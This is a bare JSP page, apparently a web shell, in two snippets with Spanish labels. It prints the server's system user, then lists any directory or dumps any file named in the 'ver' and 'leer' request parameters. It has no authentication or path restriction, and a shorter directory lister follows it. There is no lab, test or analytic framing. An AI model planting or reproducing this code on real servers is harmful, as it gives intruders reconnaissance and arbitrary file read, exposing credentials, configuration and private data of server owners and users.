<%@ page import="java.io.*" %>
<%
    out.println("<p>Usuario actual del sistema: <strong>" + System.getProperty("user.name") + "</strong></p>");

    String ruta = request.getParameter("ver");
    String archivo = request.getParameter("leer");

    if (archivo != null) {
        File f = new File(archivo);
        if (f.exists() && f.isFile()) {
            BufferedReader br = new BufferedReader(new FileReader(f));
            String linea;
            out.println("<pre>");
            while ((linea = br.readLine()) != null) {
                out.println(linea);
            }
            out.println("</pre>");
            br.close();
        } else {
            out.println("Archivo no válido.");
        }
    } else {
        if (ruta == null || ruta.trim().isEmpty()) ruta = ".";
        File carpeta = new File(ruta);
        if (carpeta.exists() && carpeta.isDirectory()) {
            out.println("<h3>Contenido de: " + carpeta.getCanonicalPath() + "</h3>");
            File[] lista = carpeta.listFiles();
            if (lista != null) {
                for (File f : lista) {
                    String tipo = f.isDirectory() ? "[DIR] " : "[FILE]";
                    String enlace = f.isDirectory() ? "?ver=" + f.getCanonicalPath() : "?leer=" + f.getCanonicalPath();
                    out.println(tipo + "<a href='" + enlace + "'>" + f.getName() + "</a><br>");
                }
            } else {
                out.println("No se pudo acceder al contenido del directorio.");
            }
        } else {
            out.println("Ruta inválida.");
        }
    }
%>


<%@ page import="java.io.*" %>
<%
    String ruta = request.getParameter("ver");
    if (ruta == null) ruta = ".";
    File carpeta = new File(ruta);
    if (carpeta.exists() && carpeta.isDirectory()) {
        for (File f : carpeta.listFiles()) {
            out.println(f.getName() + "<br>");
        }
    }
%>
